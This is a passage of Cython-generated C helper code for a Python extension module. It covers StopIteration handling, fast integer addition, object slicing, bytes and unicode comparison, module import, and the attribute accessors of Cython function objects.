    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject* exc_type = tstate->curexc_type;
    if (unlikely(exc_type)) {
        if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) {
            PyObject *exc_value, *exc_tb;
            exc_value = tstate->curexc_value;
            exc_tb = tstate->curexc_traceback;
            tstate->curexc_type = 0;
            tstate->curexc_value = 0;
            tstate->curexc_traceback = 0;
            Py_DECREF(exc_type);
            Py_XDECREF(exc_value);
            Py_XDECREF(exc_tb);
            return 0;
        } else {
            return -1;
        }
    }
    return 0;
#else
    if (unlikely(PyErr_Occurred())) {
        if (likely(PyErr_ExceptionMatches(PyExc_StopIteration))) {
            PyErr_Clear();
            return 0;
        } else {
            return -1;
        }
    }
    return 0;
#endif
}

/* UnpackItemEndCheck */
static int __Pyx_IternextUnpackEndCheck(PyObject *retval, Py_ssize_t expected) {
    if (unlikely(retval)) {
        Py_DECREF(retval);
        __Pyx_RaiseTooManyValuesError(expected);
        return -1;
    }
    return __Pyx_IterFinish();
}

/* PyIntBinop */
#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_AddObjC(PyObject *op1, PyObject *op2, CYTHON_UNUSED long intval, int inplace, int zerodivision_check) {
    (void)inplace;
    (void)zerodivision_check;
    #if PY_MAJOR_VERSION < 3
    if (likely(PyInt_CheckExact(op1))) {
        const long b = intval;
        long x;
        long a = PyInt_AS_LONG(op1);
            x = (long)((unsigned long)a + b);
            if (likely((x^a) >= 0 || (x^b) >= 0))
                return PyInt_FromLong(x);
            return PyLong_Type.tp_as_number->nb_add(op1, op2);
    }
    #endif
    #if CYTHON_USE_PYLONG_INTERNALS
    if (likely(PyLong_CheckExact(op1))) {
        const long b = intval;
        long a, x;
#ifdef HAVE_LONG_LONG
        const PY_LONG_LONG llb = intval;
        PY_LONG_LONG lla, llx;
#endif
        const digit* digits = ((PyLongObject*)op1)->ob_digit;
        const Py_ssize_t size = Py_SIZE(op1);
        if (likely(__Pyx_sst_abs(size) <= 1)) {
            a = likely(size) ? digits[0] : 0;
            if (size == -1) a = -a;
        } else {
            switch (size) {
                case -2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = (long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case -3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        a = -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        a = (long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case -4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = (long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                default: return PyLong_Type.tp_as_number->nb_add(op1, op2);
            }
        }
                x = a + b;
            return PyLong_FromLong(x);
#ifdef HAVE_LONG_LONG
        long_long:
                llx = lla + llb;
            return PyLong_FromLongLong(llx);
#endif
        
        
    }
    #endif
    if (PyFloat_CheckExact(op1)) {
        const long b = intval;
        double a = PyFloat_AS_DOUBLE(op1);
            double result;
            PyFPE_START_PROTECT("add", return NULL)
            result = ((double)a) + (double)b;
            PyFPE_END_PROTECT(result)
            return PyFloat_FromDouble(result);
    }
    return (inplace ? PyNumber_InPlaceAdd : PyNumber_Add)(op1, op2);
}
#endif

/* SliceObject */
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(PyObject* obj,
        Py_ssize_t cstart, Py_ssize_t cstop,
        PyObject** _py_start, PyObject** _py_stop, PyObject** _py_slice,
        int has_cstart, int has_cstop, CYTHON_UNUSED int wraparound) {
#if CYTHON_USE_TYPE_SLOTS
    PyMappingMethods* mp;
#if PY_MAJOR_VERSION < 3
    PySequenceMethods* ms = Py_TYPE(obj)->tp_as_sequence;
    if (likely(ms && ms->sq_slice)) {
        if (!has_cstart) {
            if (_py_start && (*_py_start != Py_None)) {
                cstart = __Pyx_PyIndex_AsSsize_t(*_py_start);
                if ((cstart == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;
            } else
                cstart = 0;
        }
        if (!has_cstop) {
            if (_py_stop && (*_py_stop != Py_None)) {
                cstop = __Pyx_PyIndex_AsSsize_t(*_py_stop);
                if ((cstop == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;
            } else
                cstop = PY_SSIZE_T_MAX;
        }
        if (wraparound && unlikely((cstart < 0) | (cstop < 0)) && likely(ms->sq_length)) {
            Py_ssize_t l = ms->sq_length(obj);
            if (likely(l >= 0)) {
                if (cstop < 0) {
                    cstop += l;
                    if (cstop < 0) cstop = 0;
                }
                if (cstart < 0) {
                    cstart += l;
                    if (cstart < 0) cstart = 0;
                }
            } else {
                if (!PyErr_ExceptionMatches(PyExc_OverflowError))
                    goto bad;
                PyErr_Clear();
            }
        }
        return ms->sq_slice(obj, cstart, cstop);
    }
#endif
    mp = Py_TYPE(obj)->tp_as_mapping;
    if (likely(mp && mp->mp_subscript))
#endif
    {
        PyObject* result;
        PyObject *py_slice, *py_start, *py_stop;
        if (_py_slice) {
            py_slice = *_py_slice;
        } else {
            PyObject* owned_start = NULL;
            PyObject* owned_stop = NULL;
            if (_py_start) {
                py_start = *_py_start;
            } else {
                if (has_cstart) {
                    owned_start = py_start = PyInt_FromSsize_t(cstart);
                    if (unlikely(!py_start)) goto bad;
                } else
                    py_start = Py_None;
            }
            if (_py_stop) {
                py_stop = *_py_stop;
            } else {
                if (has_cstop) {
                    owned_stop = py_stop = PyInt_FromSsize_t(cstop);
                    if (unlikely(!py_stop)) {
                        Py_XDECREF(owned_start);
                        goto bad;
                    }
                } else
                    py_stop = Py_None;
            }
            py_slice = PySlice_New(py_start, py_stop, Py_None);
            Py_XDECREF(owned_start);
            Py_XDECREF(owned_stop);
            if (unlikely(!py_slice)) goto bad;
        }
#if CYTHON_USE_TYPE_SLOTS
        result = mp->mp_subscript(obj, py_slice);
#else
        result = PyObject_GetItem(obj, py_slice);
#endif
        if (!_py_slice) {
            Py_DECREF(py_slice);
        }
        return result;
    }
    PyErr_Format(PyExc_TypeError,
        "'%.200s' object is unsliceable", Py_TYPE(obj)->tp_name);
bad:
    return NULL;
}

/* BytesEquals */
static CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals) {
#if CYTHON_COMPILING_IN_PYPY
    return PyObject_RichCompareBool(s1, s2, equals);
#else
    if (s1 == s2) {
        return (equals == Py_EQ);
    } else if (PyBytes_CheckExact(s1) & PyBytes_CheckExact(s2)) {
        const char *ps1, *ps2;
        Py_ssize_t length = PyBytes_GET_SIZE(s1);
        if (length != PyBytes_GET_SIZE(s2))
            return (equals == Py_NE);
        ps1 = PyBytes_AS_STRING(s1);
        ps2 = PyBytes_AS_STRING(s2);
        if (ps1[0] != ps2[0]) {
            return (equals == Py_NE);
        } else if (length == 1) {
            return (equals == Py_EQ);
        } else {
            int result;
#if CYTHON_USE_UNICODE_INTERNALS && (PY_VERSION_HEX < 0x030B0000)
            Py_hash_t hash1, hash2;
            hash1 = ((PyBytesObject*)s1)->ob_shash;
            hash2 = ((PyBytesObject*)s2)->ob_shash;
            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {
                return (equals == Py_NE);
            }
#endif
            result = memcmp(ps1, ps2, (size_t)length);
            return (equals == Py_EQ) ? (result == 0) : (result != 0);
        }
    } else if ((s1 == Py_None) & PyBytes_CheckExact(s2)) {
        return (equals == Py_NE);
    } else if ((s2 == Py_None) & PyBytes_CheckExact(s1)) {
        return (equals == Py_NE);
    } else {
        int result;
        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);
        if (!py_result)
            return -1;
        result = __Pyx_PyObject_IsTrue(py_result);
        Py_DECREF(py_result);
        return result;
    }
#endif
}

/* UnicodeEquals */
static CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals) {
#if CYTHON_COMPILING_IN_PYPY
    return PyObject_RichCompareBool(s1, s2, equals);
#else
#if PY_MAJOR_VERSION < 3
    PyObject* owned_ref = NULL;
#endif
    int s1_is_unicode, s2_is_unicode;
    if (s1 == s2) {
        goto return_eq;
    }
    s1_is_unicode = PyUnicode_CheckExact(s1);
    s2_is_unicode = PyUnicode_CheckExact(s2);
#if PY_MAJOR_VERSION < 3
    if ((s1_is_unicode & (!s2_is_unicode)) && PyString_CheckExact(s2)) {
        owned_ref = PyUnicode_FromObject(s2);
        if (unlikely(!owned_ref))
            return -1;
        s2 = owned_ref;
        s2_is_unicode = 1;
    } else if ((s2_is_unicode & (!s1_is_unicode)) && PyString_CheckExact(s1)) {
        owned_ref = PyUnicode_FromObject(s1);
        if (unlikely(!owned_ref))
            return -1;
        s1 = owned_ref;
        s1_is_unicode = 1;
    } else if (((!s2_is_unicode) & (!s1_is_unicode))) {
        return __Pyx_PyBytes_Equals(s1, s2, equals);
    }
#endif
    if (s1_is_unicode & s2_is_unicode) {
        Py_ssize_t length;
        int kind;
        void *data1, *data2;
        if (unlikely(__Pyx_PyUnicode_READY(s1) < 0) || unlikely(__Pyx_PyUnicode_READY(s2) < 0))
            return -1;
        length = __Pyx_PyUnicode_GET_LENGTH(s1);
        if (length != __Pyx_PyUnicode_GET_LENGTH(s2)) {
            goto return_ne;
        }
#if CYTHON_USE_UNICODE_INTERNALS
        {
            Py_hash_t hash1, hash2;
        #if CYTHON_PEP393_ENABLED
            hash1 = ((PyASCIIObject*)s1)->hash;
            hash2 = ((PyASCIIObject*)s2)->hash;
        #else
            hash1 = ((PyUnicodeObject*)s1)->hash;
            hash2 = ((PyUnicodeObject*)s2)->hash;
        #endif
            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {
                goto return_ne;
            }
        }
#endif
        kind = __Pyx_PyUnicode_KIND(s1);
        if (kind != __Pyx_PyUnicode_KIND(s2)) {
            goto return_ne;
        }
        data1 = __Pyx_PyUnicode_DATA(s1);
        data2 = __Pyx_PyUnicode_DATA(s2);
        if (__Pyx_PyUnicode_READ(kind, data1, 0) != __Pyx_PyUnicode_READ(kind, data2, 0)) {
            goto return_ne;
        } else if (length == 1) {
            goto return_eq;
        } else {
            int result = memcmp(data1, data2, (size_t)(length * kind));
            #if PY_MAJOR_VERSION < 3
            Py_XDECREF(owned_ref);
            #endif
            return (equals == Py_EQ) ? (result == 0) : (result != 0);
        }
    } else if ((s1 == Py_None) & s2_is_unicode) {
        goto return_ne;
    } else if ((s2 == Py_None) & s1_is_unicode) {
        goto return_ne;
    } else {
        int result;
        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);
        #if PY_MAJOR_VERSION < 3
        Py_XDECREF(owned_ref);
        #endif
        if (!py_result)
            return -1;
        result = __Pyx_PyObject_IsTrue(py_result);
        Py_DECREF(py_result);
        return result;
    }
return_eq:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(owned_ref);
    #endif
    return (equals == Py_EQ);
return_ne:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(owned_ref);
    #endif
    return (equals == Py_NE);
#endif
}

/* PyObject_GenericGetAttrNoDict */
#if CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP && PY_VERSION_HEX < 0x03070000
static PyObject *__Pyx_RaiseGenericGetAttributeError(PyTypeObject *tp, PyObject *attr_name) {
    PyErr_Format(PyExc_AttributeError,
#if PY_MAJOR_VERSION >= 3
                 "'%.50s' object has no attribute '%U'",
                 tp->tp_name, attr_name);
#else
                 "'%.50s' object has no attribute '%.400s'",
                 tp->tp_name, PyString_AS_STRING(attr_name));
#endif
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_GenericGetAttrNoDict(PyObject* obj, PyObject* attr_name) {
    PyObject *descr;
    PyTypeObject *tp = Py_TYPE(obj);
    if (unlikely(!PyString_Check(attr_name))) {
        return PyObject_GenericGetAttr(obj, attr_name);
    }
    assert(!tp->tp_dictoffset);
    descr = _PyType_Lookup(tp, attr_name);
    if (unlikely(!descr)) {
        return __Pyx_RaiseGenericGetAttributeError(tp, attr_name);
    }
    Py_INCREF(descr);
    #if PY_MAJOR_VERSION < 3
    if (likely(PyType_HasFeature(Py_TYPE(descr), Py_TPFLAGS_HAVE_CLASS)))
    #endif
    {
        descrgetfunc f = Py_TYPE(descr)->tp_descr_get;
        if (unlikely(f)) {
            PyObject *res = f(descr, obj, (PyObject *)tp);
            Py_DECREF(descr);
            return res;
        }
    }
    return descr;
}
#endif

/* Import */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *empty_list = 0;
    PyObject *module = 0;
    PyObject *global_dict = 0;
    PyObject *empty_dict = 0;
    PyObject *list;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
    #endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
            #endif
        }
    }
bad:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}

/* ImportFrom */
static PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name) {
    PyObject* value = __Pyx_PyObject_GetAttrStr(module, name);
    if (unlikely(!value) && PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Format(PyExc_ImportError,
        #if PY_MAJOR_VERSION < 3
            "cannot import name %.230s", PyString_AS_STRING(name));
        #else
            "cannot import name %S", name);
        #endif
    }
    return value;
}

/* FetchCommonType */
static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type) {
    PyObject* fake_module;
    PyTypeObject* cached_type = NULL;
    fake_module = PyImport_AddModule((char*) "_cython_" CYTHON_ABI);
    if (!fake_module) return NULL;
    Py_INCREF(fake_module);
    cached_type = (PyTypeObject*) PyObject_GetAttrString(fake_module, type->tp_name);
    if (cached_type) {
        if (!PyType_Check((PyObject*)cached_type)) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s is not a type object",
                type->tp_name);
            goto bad;
        }
        if (cached_type->tp_basicsize != type->tp_basicsize) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s has the wrong size, try recompiling",
                type->tp_name);
            goto bad;
        }
    } else {
        if (!PyErr_ExceptionMatches(PyExc_AttributeError)) goto bad;
        PyErr_Clear();
        if (PyType_Ready(type) < 0) goto bad;
        if (PyObject_SetAttrString(fake_module, type->tp_name, (PyObject*) type) < 0)
            goto bad;
        Py_INCREF(type);
        cached_type = type;
    }
done:
    Py_DECREF(fake_module);
    return cached_type;
bad:
    Py_XDECREF(cached_type);
    cached_type = NULL;
    goto done;
}

/* CythonFunctionShared */
#include <structmember.h>
static PyObject *
__Pyx_CyFunction_get_doc(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *closure)
{
    if (unlikely(op->func_doc == NULL)) {
        if (op->func.m_ml->ml_doc) {
#if PY_MAJOR_VERSION >= 3
            op->func_doc = PyUnicode_FromString(op->func.m_ml->ml_doc);
#else
            op->func_doc = PyString_FromString(op->func.m_ml->ml_doc);
#endif
            if (unlikely(op->func_doc == NULL))
                return NULL;
        } else {
            Py_INCREF(Py_None);
            return Py_None;
        }
    }
    Py_INCREF(op->func_doc);
    return op->func_doc;
}
static int
__Pyx_CyFunction_set_doc(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp = op->func_doc;
    if (value == NULL) {
        value = Py_None;
    }
    Py_INCREF(value);
    op->func_doc = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_name(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    if (unlikely(op->func_name == NULL)) {
#if PY_MAJOR_VERSION >= 3
        op->func_name = PyUnicode_InternFromString(op->func.m_ml->ml_name);
#else
        op->func_name = PyString_InternFromString(op->func.m_ml->ml_name);
#endif
        if (unlikely(op->func_name == NULL))
            return NULL;
    }
    Py_INCREF(op->func_name);
    return op->func_name;
}
static int
__Pyx_CyFunction_set_name(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__name__ must be set to a string object");
        return -1;
    }
    tmp = op->func_name;
    Py_INCREF(value);
    op->func_name = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_qualname(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(op->func_qualname);
    return op->func_qualname;
}
static int
__Pyx_CyFunction_set_qualname(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__qualname__ must be set to a string object");
        return -1;
    }
    tmp = op->func_qualname;
    Py_INCREF(value);
    op->func_qualname = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_self(__pyx_CyFunctionObject *m, CYTHON_UNUSED void *closure)
{
    PyObject *self;
    self = m->func_closure;
    if (self == NULL)
        self = Py_None;
    Py_INCREF(self);
    return self;
}
static PyObject *
__Pyx_CyFunction_get_dict(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    if (unlikely(op->func_dict == NULL)) {
        op->func_dict = PyDict_New();
        if (unlikely(op->func_dict == NULL))
            return NULL;
    }
    Py_INCREF(op->func_dict);
    return op->func_dict;
}
static int
__Pyx_CyFunction_set_dict(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
    if (unlikely(value == NULL)) {
        PyErr_SetString(PyExc_TypeError,
               "function's dictionary may not be deleted");
        return -1;
    }
    if (unlikely(!PyDict_Check(value))) {
        PyErr_SetString(PyExc_TypeError,
               "setting function's dictionary to a non-dict");
        return -1;
    }
    tmp = op->func_dict;
    Py_INCREF(value);
    op->func_dict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_globals(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(op->func_globals);
    return op->func_globals;
}
static PyObject *
__Pyx_CyFunction_get_closure(CYTHON_UNUSED __pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(Py_None);
    return Py_None;
}
static PyObject *
__Pyx_CyFunction_get_code(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    PyObject* result = (op->func_code) ? op->func_code : Py_None;
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_init_defaults(__pyx_CyFunctionObject *op) {
    int result = 0;
    PyObject *res = op->defaults_getter((PyObject *) op);
    if (unlikely(!res))
        return -1;
    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    op->defaults_tuple = PyTuple_GET_ITEM(res, 0);
    Py_INCREF(op->defaults_tuple);
    op->defaults_kwdict = PyTuple_GET_ITEM(res, 1);
    Py_INCREF(op->defaults_kwdict);
    #else
    op->defaults_tuple = PySequence_ITEM(res, 0);
    if (unlikely(!op->defaults_tuple)) result = -1;
    else {
        op->defaults_kwdict = PySequence_ITEM(res, 1);
        if (unlikely(!op->defaults_kwdict)) result = -1;
    }
    #endif
    Py_DECREF(res);
    return result;
}
static int
__Pyx_CyFunction_set_defaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    } else if (value != Py_None && !PyTuple_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__defaults__ must be set to a tuple object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_tuple;
    op->defaults_tuple = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_defaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->defaults_tuple;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_tuple;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_kwdefaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    } else if (value != Py_None && !PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__kwdefaults__ must be set to a dict object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_kwdict;
    op->defaults_kwdict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_kwdefaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->defaults_kwdict;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_kwdict;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_annotations(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value || value == Py_None) {
        value = NULL;
    } else if (!PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__annotations__ must be set to a dict object");
        return -1;
    }
    Py_XINCREF(value);
    tmp = op->func_annotations;
    op->func_annotations = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_annotations(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->func_annotations;
    if (unlikely(!result)) {
        result = PyDict_New();
        if (unlikely(!result)) return NULL;
        op->func_annotations = result;
    }
    Py_INCREF(result);
    return result;
}
static PyGetSetDef __pyx_CyFunction_getsets[] = {
    {(char *) "func_doc", (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "__doc__",  (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "func_name", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__name__", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__qualname__", (getter)__Pyx_CyFunction_get_qualname, (setter)__Pyx_CyFunction_set_qualname, 0, 0},
    {(char *) "__self__", (getter)__Pyx_CyFunction_get_self, 0, 0, 0},
    {(char *) "func_dict", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "__dict__", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "func_globals", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "__globals__", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "func_closure", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "__closure__", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "func_code", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "__code__", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "func_defaults", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__defaults__", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__kwdefaults__", (getter)__Pyx_CyFunction_get_kwdefaults, (setter)__Pyx_CyFunction_set_kwdefaults, 0, 0},
    {(char *) "__annotations__", (getter)__Pyx_CyFunction_get_annotations, (setter)__Pyx_CyFunction_set_annotations, 0, 0},
    {0, 0, 0, 0, 0}
};
static PyMemberDef __pyx_CyFunction_members[] = {
    {(char *) "__module__", T_OBJECT, offsetof(PyCFunctionObject, m_module), PY_WRITE_RESTRICTED, 0},
    {0, 0, 0,  0, 0}
};
static PyObject *
__Pyx_CyFunction_reduce(__pyx_CyFunctionObject *m, CYTHON_UNUSED PyObject *args)
{
#if PY_MAJOR_VERSION >= 3
    Py_INCREF(m->func_qualname);
    return m->func_qualname;
#else
    return PyString_FromString(m->func.m_ml->ml_name);
#endif
}
static PyMethodDef __pyx_CyFunction_methods[] = {
    {"__reduce__", (PyCFunction)__Pyx_CyFunction_reduce, METH_VARARGS, 0},
    {0, 0, 0, 0}
};
#if PY_VERSION_HEX < 0x030500A0
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func_weakreflist)
#else
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func.m_weakreflist)
#endif
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject *op, PyMethodDef *ml, int flags, PyObject* qualname,
                                       PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    if (unlikely(op == NULL))
        return NULL;
    op->flags = flags;
    __Pyx_CyFunction_weakreflist(op) = NULL;
